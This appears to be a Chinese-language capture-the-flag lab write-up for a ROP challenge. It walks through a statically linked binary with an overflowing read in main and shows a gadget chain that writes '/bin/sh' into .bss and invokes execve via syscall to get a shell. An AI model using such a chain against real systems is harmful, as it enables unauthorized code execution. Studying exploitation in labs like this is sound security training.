# lab 5 rop

題目告訴你是ROP了 因為它用static編 所以有很多gadget用
```=
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
咦 canary 有開 但是看 asm 卻沒有
```=
            0x00400b4d      55             push rbp
|           0x00400b4e      4889e5         mov rbp, rsp
|           0x00400b51      4883ec10       sub rsp, 0x10
|           0x00400b55      488d3dcc1509.  lea rdi, qword str.This_is_your_first_rop_challenge ; 0x492128 ; "This is your first rop challenge ;)"
|           0x00400b5c      e8cff60000     call sym.puts               ; int puts(const char *s)
|           0x00400b61      488b05388c2b.  mov rax, qword obj.stdout   ; obj._IO_stdout ; [0x6b97a0:8]=0x6b9360 obj._IO_2_1_stdout ; "`\x93k"
|           0x00400b68      4889c7         mov rdi, rax
|           0x00400b6b      e8d0f20000     call sym._IO_fflush
|           0x00400b70      488d45f0       lea rax, qword [local_10h]
|           0x00400b74      ba90000000     mov edx, 0x90               ; 144
|           0x00400b79      4889c6         mov rsi, rax
|           0x00400b7c      bf00000000     mov edi, 0
|           0x00400b81      e81a890400     call sym.__read             ; sym.__open+0x1c0
|           0x00400b86      b800000000     mov eax, 0
|           0x00400b8b      c9             leave
\           0x00400b8c      c3             ret

```
應該是某些函數有 main沒有

找 gadget

`ROPgadget --binary rop>list`

找 bss
`read -S rop|grep bss`

```=
[15] .tbss             NOBITS           00000000006b6140  000b6140
[26] .bss              NOBITS           00000000006bb2e0  000bb2d8
```


|%rax	|System call	|%rdi|	%rsi|	%rdx	|%r10|	%r8|	%r9|
|-----|-------------|----|------|-------|----|-----|-----|

|疊起來|註解|
|-|-|
|pop rdi ; ret;| 它會 pop bss的addr |
|bss的addr|
|pop rsi ; ret;|
|/bin/sh\x00|
|mov qword ptr [rdi],rsi ; ret;|把rsi的值放到 以rdi為位置 的值裡面|
|pop rsi ; ret;|設定參數|
|0x0|
|pop rdx ; ret;|設定參數|
|0x0|
|pop rax ; ret;|設定參數|
|0x3b|
|syscall ; ret;|

參數設定好 然後call execve
